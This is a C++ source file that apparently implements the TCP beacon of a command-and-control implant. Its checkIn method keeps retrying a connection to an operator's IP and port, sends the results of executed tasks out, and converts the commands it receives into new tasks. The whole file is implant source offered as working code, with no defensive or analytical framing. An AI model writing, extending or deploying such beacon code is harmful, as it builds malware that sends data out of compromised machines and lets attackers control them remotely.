#include "BeaconTcp.hpp"

using namespace std;
using namespace SocketHandler;


BeaconTcp::BeaconTcp(std::string& ip, int port)
	: Beacon(ip, port)
{
	m_client=new Client(m_ip, m_port);
}


BeaconTcp::~BeaconTcp()
{
	delete m_client;
}


void BeaconTcp::checkIn()
{	
	SPDLOG_DEBUG("initConnection");
	while(!m_client->initConnection())
	{
		std::this_thread::sleep_for(std::chrono::milliseconds(333));
		SPDLOG_DEBUG("initConnection");
	}

	std::string output;
	taskResultsToCmd(output);

	SPDLOG_DEBUG("sending output.size {0}", std::to_string(output.size()));

	bool res = m_client->sendData(output);
	if(res)
	{
		string input;
		res=m_client->receive(input);
		if(res)
		{
			SPDLOG_DEBUG("received input.size {0}", std::to_string(input.size()));

			if(!input.empty())
			{
				cmdToTasks(input);
			}
		}
		else
			SPDLOG_DEBUG("Receive failed");
	}
	else
		SPDLOG_DEBUG("Send failed");

	m_client->closeConnection();
}

	



